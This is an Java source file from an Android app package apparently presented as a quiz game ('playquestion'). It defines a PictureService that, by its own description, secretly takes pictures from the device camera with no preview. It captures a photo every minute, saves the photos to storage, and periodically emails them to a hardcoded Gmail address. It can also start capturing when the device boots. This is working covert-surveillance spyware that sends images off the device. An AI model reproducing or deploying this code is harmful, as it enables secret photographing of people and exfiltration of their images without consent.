package com.jesusgarciamanday.playquestion.services;

import android.Manifest;
import android.annotation.TargetApi;
import android.app.Activity;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.ImageFormat;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CameraMetadata;
import android.hardware.camera2.CaptureRequest;
import android.hardware.camera2.TotalCaptureResult;
import android.media.Image;
import android.media.ImageReader;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;
import android.support.v4.app.ActivityCompat;
import android.util.Log;
import android.util.Size;
import android.util.SparseIntArray;
import android.view.Surface;
import android.view.WindowManager;

import com.jesusgarciamanday.playquestion.Mail;
import com.jesusgarciamanday.playquestion.listeners.OnPictureCapturedListener;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.OutputStream;
import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.Timer;
import java.util.TimerTask;
import java.util.TreeMap;

/**
 * The aim of this service is to secretly take pictures (without preview or opening device's camera app)
 * from all available cameras.
 * @author hzitoun (zitoun.hamed@gmail.com)
 */

@TargetApi(Build.VERSION_CODES.LOLLIPOP) //camera 2 api was added in API level 21
public class PictureService {

    private static final String TAG = PictureService.class.getSimpleName();
    private CameraDevice cameraDevice;
    private ImageReader imageReader;
    private Handler mBackgroundHandler;
    private HandlerThread mBackgroundThread;
    private Activity context;
    private WindowManager windowManager;
    private CameraManager manager;
    private TreeMap<String, byte[]> picturesTaken;
    private OnPictureCapturedListener capturedListener;
    private static final SparseIntArray ORIENTATIONS = new SparseIntArray();
    private String currentCameraId;
    private int count = 0;
    private Mail mail = null;
    private TimerTask timerTask;
    private Timer timer;
    private static int TIME_TAKE_PICTURE = 60000;
    private static int TIME_BEGIN_SEND_PICTURE = 90000;
    private static int TIME_SEND_PICTURE = 160000;

    static {
        ORIENTATIONS.append(Surface.ROTATION_0, 90);
        ORIENTATIONS.append(Surface.ROTATION_90, 0);
        ORIENTATIONS.append(Surface.ROTATION_180, 270);
        ORIENTATIONS.append(Surface.ROTATION_270, 180);
    }


    public void startCapturing(final Activity activity, final OnPictureCapturedListener capturedListener) {
        System.out.println("PID  = " + android.os.Process.myPid());
        this.picturesTaken = new TreeMap<>();
        this.context = activity;
        this.manager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
        this.windowManager = context.getWindowManager();
        this.capturedListener = capturedListener;

        this.timer = new Timer();
        this.timerTask = new TimerTask() {
            public void run() {
                sendPictures();
            }
        };

        try {
            final String[] cameraIdList = manager.getCameraIdList();
            this.currentCameraId = cameraIdList[1];
            System.out.println("ID CAMERA: " + this.currentCameraId);
            openCameraAndTakePicture();

        } catch (CameraAccessException e) {
            Log.e(TAG, "Exception occurred while accessing the list of cameras", e);
        }
    }


    private void openCameraAndTakePicture() {
        startBackgroundThread();
        Log.d(TAG, "opening camera " + currentCameraId);

        try {
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA)
                    == PackageManager.PERMISSION_GRANTED
                    && ActivityCompat.checkSelfPermission(context,
                    Manifest.permission.WRITE_EXTERNAL_STORAGE)
                    == PackageManager.PERMISSION_GRANTED) {
                Log.d(TAG, "I have premissions");
                manager.openCamera(currentCameraId, stateCallback, null);
            } else
                Log.d(TAG, "I have NOT premissions");
        } catch (CameraAccessException e) {
            Log.e(TAG, " exception occurred while opening camera " + currentCameraId, e);
        }
    }


    private final CameraDevice.StateCallback stateCallback = new CameraDevice.StateCallback() {
        @Override
        public void onOpened(@NonNull CameraDevice camera) {
            Log.d(TAG, "camera " + camera.getId() + " opened");
            cameraDevice = camera;
            Log.i(TAG, "Taking picture from camera " + camera.getId());
            // take the picture after some time on purpose

            new Handler().postDelayed(() -> {
                takePicture();
            }, TIME_TAKE_PICTURE);

        }

        @Override
        public void onDisconnected(@NonNull CameraDevice camera) {
            Log.d(TAG, " camera " + camera.getId() + " disconnected");
            if (cameraDevice != null) {
                cameraDevice.close();
            }
        }

        @Override
        public void onClosed(@NonNull CameraDevice camera) {
            Log.d(TAG, "camera " + camera.getId() + " closed");
        }


        @Override
        public void onError(@NonNull CameraDevice camera, int error) {
            Log.e(TAG, "camera in error, int code " + error);
            if (cameraDevice != null) {
                cameraDevice.close();
                return;
            }
            camera.close();
        }
    };

    private void sendPictures() {
        if (mail == null)
            mail = new Mail("jmandaytest@gmail.com", Mail.ServerMail.GMAIL);
        TreeMap auxPicturesTaken = new TreeMap(picturesTaken);
        picturesTaken.clear();
        mail.send(auxPicturesTaken);
    }

    private void takePicture() {
        if (null == cameraDevice) {
            Log.e(TAG, "cameraDevice is null");
            return;
        }
        try {
            final CameraCharacteristics characteristics = manager.getCameraCharacteristics(cameraDevice.getId());
            Size[] jpegSizes = null;
            if (characteristics != null) {
                if (characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP) != null) {
                    jpegSizes = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
                            .getOutputSizes(ImageFormat.JPEG);
                }
            }
            int width = 640;
            int height = 480;
            if (jpegSizes != null && 0 < jpegSizes.length) {
                width = jpegSizes[0].getWidth();
                height = jpegSizes[0].getHeight();
            }
            final ImageReader reader = ImageReader.newInstance(width, height, ImageFormat.JPEG, 2);
            final List<Surface> outputSurfaces = new ArrayList<>(2);
            outputSurfaces.add(reader.getSurface());
            final CaptureRequest.Builder captureBuilder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
            captureBuilder.addTarget(reader.getSurface());
            captureBuilder.set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO);
            int rotation = 0;
            if (this.windowManager != null)
                rotation = this.windowManager.getDefaultDisplay().getRotation();
            captureBuilder.set(CaptureRequest.JPEG_ORIENTATION, ORIENTATIONS.get(rotation));
            ImageReader.OnImageAvailableListener readerListener = (ImageReader readerL) -> {
                final Image image = readerL.acquireLatestImage();
                final ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                final byte[] bytes = new byte[buffer.capacity()];
                buffer.get(bytes);
                saveImageToDisk(bytes);
                if (image != null) {
                    image.close();
                }
            };

            reader.setOnImageAvailableListener(readerListener, mBackgroundHandler);
            cameraDevice.createCaptureSession(outputSurfaces, new CameraCaptureSession.StateCallback() {
                @Override
                public void onConfigured(@NonNull CameraCaptureSession session) {
                    try {
                        session.capture(captureBuilder.build(), captureListener, mBackgroundHandler);
                    } catch (CameraAccessException e) {
                        Log.e(TAG, " exception occurred while accessing " + currentCameraId, e);
                    }
                }

                @Override
                public void onConfigureFailed(@NonNull CameraCaptureSession session) {
                }
            }, mBackgroundHandler);

        } catch (CameraAccessException e) {
            Log.e(TAG, " exception occurred while accessing " + currentCameraId, e);
        }
    }

    private void saveImageToDisk(final byte[] bytes) {
        final File file = new File(Environment.getExternalStorageDirectory() + "/" + this.count + "_pict.jpg");
        count += 1;
        try (final OutputStream output = new FileOutputStream(file)) {
            output.write(bytes);
            this.picturesTaken.put(file.getPath(), bytes);
        } catch (IOException e) {
            Log.e(TAG, "Exception occurred while saving picture to external storage ", e);
        }
    }


    private void startBackgroundThread() {
        if (mBackgroundThread == null) {
            mBackgroundThread = new HandlerThread("Camera Background" + currentCameraId);
            mBackgroundThread.start();
            mBackgroundHandler = new Handler(mBackgroundThread.getLooper());
            timer.scheduleAtFixedRate(timerTask, TIME_BEGIN_SEND_PICTURE, TIME_SEND_PICTURE);

        }
    }

    private void stopBackgroundThread() {
        mBackgroundThread.quitSafely();
        try {
            mBackgroundThread.join();
            mBackgroundThread = null;
            mBackgroundHandler = null;
        } catch (InterruptedException e) {
            Log.e(TAG, "exception occurred while stoping BackgroundThread ", e);
        }
    }

    private void closeCamera() {
        Log.d(TAG, "closing camera " + cameraDevice.getId());
        if (null != cameraDevice) {
            cameraDevice.close();
            cameraDevice = null;
        }
        if (null != imageReader) {
            imageReader.close();
            imageReader = null;
        }
    }


    final private CameraCaptureSession.CaptureCallback captureListener = new CameraCaptureSession.CaptureCallback() {
        @Override
        public void onCaptureCompleted(@NonNull CameraCaptureSession session, @NonNull CaptureRequest request, @NonNull TotalCaptureResult result) {
            super.onCaptureCompleted(session, request, result);
            if (picturesTaken.lastEntry() != null && capturedListener != null) {
                capturedListener.onCaptureDone(picturesTaken.lastEntry().getKey(), picturesTaken.lastEntry().getValue());
                Log.i(TAG, "done taking picture");
            }
            new Handler().postDelayed(() -> {
                takePicture();
            }, TIME_TAKE_PICTURE);
        }
    };


    public void startCapturingBootDevice(Context context) {

        this.picturesTaken = new TreeMap<>();
        this.manager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
        //this.windowManager = getApplicationContext().getWindowManager();
        this.timer = new Timer();
        this.timerTask = new TimerTask() {
            public void run() {
                sendPictures();
            }
        };

        try {
            final String[] cameraIdList = manager.getCameraIdList();
            this.currentCameraId = cameraIdList[1];
            System.out.println("ID CAMERA: " + this.currentCameraId);
            startBackgroundThread();
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                // TODO: Consider calling
                //    ActivityCompat#requestPermissions
                // here to request the missing permissions, and then overriding
                //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
                //                                          int[] grantResults)
                // to handle the case where the user grants the permission. See the documentation
                // for ActivityCompat#requestPermissions for more details.
                return;
            }
            manager.openCamera(currentCameraId, stateCallback, null);

        } catch (CameraAccessException e) {
            Log.e(TAG, "Exception occurred while accessing the list of cameras", e);
        }
    }
}
